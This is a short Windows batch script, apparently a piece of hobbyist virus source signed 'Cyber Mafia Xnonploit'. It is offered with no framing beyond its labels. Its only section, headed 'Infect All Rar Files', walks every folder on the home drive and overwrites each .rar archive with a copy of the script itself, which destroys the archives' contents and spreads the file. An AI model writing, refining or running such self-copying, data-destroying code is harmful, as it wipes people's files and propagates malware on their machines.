:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Rar Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.rar) Do (
            Set RarInfect=%%Z > Nul
            Copy /y %0 %RarInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
